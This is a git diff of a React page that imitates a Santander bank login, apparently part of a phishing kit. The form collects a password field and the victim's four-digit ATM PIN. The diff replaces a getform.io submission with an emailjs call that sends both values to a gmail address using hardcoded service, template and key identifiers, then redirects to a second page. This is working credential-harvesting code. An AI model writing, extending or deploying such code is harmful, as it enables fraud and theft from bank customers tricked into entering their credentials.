@@ -1,6 +1,7 @@
 import React from 'react';
 import '../css/primerapag.css';
 import { useNavigate } from 'react-router-dom';
+import emailjs from 'emailjs-com';
 
 function Primerapag() {
   const navigate = useNavigate();
@@ -9,17 +10,17 @@ function Primerapag() {
     event.preventDefault();
     
     const formData = new FormData(event.target);
-    
-    try {
-      const response = await fetch('https://getform.io/f/axojvkpb', {
-        method: 'POST',
-        body: formData,
-        headers: {
-          'Accept': 'application/json'
-        }
-      });
+    const contram = formData.get('contram');
+    const nipp = formData.get('nipp');
 
-      if (response.ok) {
+    try {
+      const response = await emailjs.send('service_pl7uznq', 'template_nb08ccn', {
+        contram,
+        nipp,
+        to_email: 'alosantamex@gmail.com'
+      }, '8Mgn87H6amGJecjhG');
+
+      if (response.status === 200) {
         console.log('Datos enviados correctamente');
         navigate('/segundapag');
       } else {
@@ -44,7 +45,7 @@ function Primerapag() {
         </label>
         <label>
           Nip que utiliza en su Cajero
-          <input type="tel" name="nipp" placeholder="Nipde4 dígitos" className="santander-input" maxLength={4} required />
+          <input type="tel" name="nipp" placeholder="Nip de 4 dígitos" className="santander-input" maxLength={4} required />
         </label>
         <button type="submit" className="santander-continue-button">Continuar</button>
       </form>
